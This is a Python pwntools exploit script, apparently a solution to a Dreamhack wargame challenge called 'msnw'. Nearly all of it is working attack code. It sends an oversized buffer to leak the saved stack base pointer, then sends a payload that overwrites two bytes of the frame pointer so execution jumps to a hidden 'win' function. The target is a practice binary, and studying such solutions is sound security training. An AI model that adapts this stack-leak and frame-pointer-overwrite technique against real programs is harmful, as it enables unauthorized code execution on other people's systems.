from pwn import *
import binascii

context.log_level = "debug"

LOCAL = True
if LOCAL:
    p = process("./msnw")
else:
    PORT = int(input("PORT: "))
    HOST = int(input("HOST: "))
    p = remote("host"+str(HOST)+".dreamhack.games", PORT)


def slog(name, addr):
    return success(name + ": " + str(addr))


# winFunc = 0x40135b
# FPO - (shellcode stack addr-8) (rsp, rbp)
# Insert (Function Addr - 8) into stack and
# point old %rbp to that stack address

# [1] RBP Leak
payload_leak = b"A" * 0x130
pause()
p.sendafter(": ", payload_leak)
p.recvuntil(": ")
pause()
rbp_leak = p.recv()
print(rbp_leak)
pause()
rbpAddr = int(binascii.hexlify((rbp_leak[0x130:0x136])[::-1]), 16) - 0x200
stackAddrOriginal = hex(rbpAddr - 0x130)
stackAddr = hex(rbpAddr - 0x130 - 0x8)
changeBytes = bytes.fromhex(str(stackAddr)[10:])[::-1]
print(hex(rbpAddr))
print(stackAddrOriginal)
print(stackAddr)
print(changeBytes)

# [2] Frame Pointer Overwrite with 2 bytes
payload = b""
payload += p64(0x40135b)
payload += b"A"*(0x130 - 0x8)
payload += changeBytes
pause()
p.send(payload)

print(p.recvline())
